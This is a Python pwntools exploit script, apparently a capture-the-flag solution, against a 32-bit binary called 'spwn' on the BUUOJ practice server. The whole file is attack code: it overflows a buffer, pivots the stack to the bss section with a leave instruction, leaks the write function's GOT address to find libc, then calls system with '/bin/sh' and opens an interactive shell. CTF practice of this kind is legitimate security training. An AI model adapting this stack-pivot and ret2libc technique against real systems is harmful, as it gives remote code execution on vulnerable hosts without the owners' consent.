from pwn import *

elf = ELF('./spwn')

local = 0
if local == 1:
    io = process('./spwn')
    #gdb.attach(io,'b * 0x08048511')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('node4.buuoj.cn',26203)

bss = 0x804a300
leave_addr = 0x08048511
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

io.recvuntil("name?")
shellcode = p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
io.sendline(shellcode)
io.recvuntil("say?")
payload = 'a'*0x18+p32(bss)+p32(leave_addr)
io.send(payload)
write_addr = u32(io.recv(4))
print(hex(write_addr))

libcbase = write_addr - 0x0d43c0
system_addr = libcbase + 0x3a940
binsh = libcbase + 0x15902b
io.recvuntil("name?")
io.sendline(p32(0xdeadbeef)+p32(system_addr)+p32(0)+p32(binsh)+p32(0))
io.recvuntil("say?")
payload = 'a'*0x18+p32(bss)+p32(leave_addr)
io.send(payload)

io.interactive()
